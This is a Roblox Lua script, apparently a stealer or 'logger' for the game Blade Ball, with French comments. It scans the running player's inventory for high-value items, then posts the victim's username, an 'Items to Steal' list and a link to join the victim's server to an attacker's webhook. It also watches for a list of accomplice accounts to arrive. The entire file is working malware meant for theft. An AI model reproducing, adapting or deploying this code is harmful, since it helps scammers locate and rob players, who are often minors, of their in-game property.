-- // SECURITE EXECUTION
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

-- // CONFIGURATION
local auth_token = "EBK-SS-A" 
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local categories = {"Sword", "Emote", "Explosion"}

-- Récupération des globales
local users = _G.Usernames or {"Silv3rTurboH3ro", "Ddr5pri","Andrewdagoatya","EmmaQueen2024_YT","Ech0_Night2010YT","EpicClawSilver","PhoenixSilver2011","XxElla_R0CK3TXX"}
local min_rap = _G.min_rap or 50
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

if webhook == "" then return end

local totalRAP = 0
local itemsFound = {}

-- // FORMATAGE NOMBRE
local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local idx = 1
    while number >= 1000 and idx < #suffixes do
        number = number / 1000
        idx = idx + 1
    end
    return idx == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[idx])
end

-- // FONCTIONS D'ENVOI
local function SendJoinMessage(list, prefix)
    local isGoodHit = totalRAP >= 500
    local embedColor = isGoodHit and 65280 or 8323327
    
    local grouped = {}
    for _, item in ipairs(list) do
        grouped[item.Name] = (grouped[item.Name] or 0) + 1
    end

    local listText = ""
    for name, count in pairs(grouped) do
        listText = listText .. name .. " (x" .. count .. ")\n"
    end

    local data = {
        ["auth_token"] = auth_token,
        ["username"] = isGoodHit and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT",
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = isGoodHit and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯",
            ["color"] = embedColor,
            ["fields"] = {
                {name = "Victim Username 🤖:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId, inline = false},
                {name = "Item list 📝:", value = listText ~= "" and listText or "None", inline = false},
                {name = "Summary 💰:", value = "Total RAP: **" .. formatNumber(totalRAP) .. "**", inline = false}
            },
            ["footer"] = {["text"] = "Blade Ball logger by Eblack"}
        }}
    }
    
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        pcall(function()
            requestFunc({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
        end)
    end
end

local function SendMessage(list)
    local isGoodHit = totalRAP >= 500
    local embedColor = isGoodHit and 65280 or 8323327 -- VERT si > 500, sinon VIOLET
    
    local grouped = {}
    for _, item in ipairs(list) do
        grouped[item.Name] = (grouped[item.Name] or 0) + 1
    end

    local listText = ""
    for name, count in pairs(grouped) do
        listText = listText .. name .. " (x" .. count .. ")\n"
    end

    local data = {
        ["auth_token"] = auth_token,
        ["username"] = isGoodHit and "⚪ Eblack - SERVER HIT (GOOD)" or "⚪ Eblack - SERVER HIT (SMALL)",
        ["embeds"] = {{
            ["title"] = "⚪ Server Hit 🎉",
            ["color"] = embedColor, -- LA COULEUR CHANGE ICI
            ["fields"] = {
                {name = "Victim Username 🤖:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "Status 📈:", value = isGoodHit and "🟢 GOOD HIT" or "🟣 SMALL HIT", inline = true},
                {name = "Items to Steal 📝:", value = listText ~= "" and listText or "None", inline = false},
                {name = "Summary 💰:", value = "Total RAP: **" .. formatNumber(totalRAP) .. "**", inline = false}
            },
            ["footer"] = {["text"] = "Blade Ball logger by Eblack"}
        }}
    }
    
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        pcall(function()
            requestFunc({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
        end)
    end
end

-- // SCAN INVENTAIRE
local clientInventory = require(ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(ReplicatedStorage.Packages.Replion)
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items

local function buildMap(cat)
    local m = {}
    local d = rapData[cat]
    if not d then return m end
    for k, r in pairs(d) do
        local s, dec = pcall(function() return HttpService:JSONDecode(k) end)
        if s and type(dec) == "table" then
            for _, p in ipairs(dec) do if p[1] == "Name" then m[p[2]] = r break end end
        end
    end
    return m
end

for _, cat in ipairs(categories) do
    local map = buildMap(cat)
    if clientInventory[cat] then
        for id, info in pairs(clientInventory[cat]) do
            local rap = map[info.Name] or 0
            if rap >= min_rap then
                totalRAP = totalRAP + rap
                table.insert(itemsFound, {Name = info.Name, RAP = rap})
            end
        end
    end
end

-- // EXECUTION DES ENVOIS
if #itemsFound > 0 then
    -- 1. Envoi immédiat du Scan
    SendJoinMessage(itemsFound, (ping == "Yes" and "@everyone " or ""))

    -- 2. Détection de ton arrivée
    local hasSentHit = false
    local function checkPlayer(player)
        if not hasSentHit and table.find(users, player.Name) then
            hasSentHit = true
            SendMessage(itemsFound)
        end
    end

    -- Vérifie les joueurs déjà présents
    for _, p in ipairs(Players:GetPlayers()) do
        checkPlayer(p)
    end
    
    -- Écoute les nouveaux arrivants
    Players.PlayerAdded:Connect(checkPlayer)
end
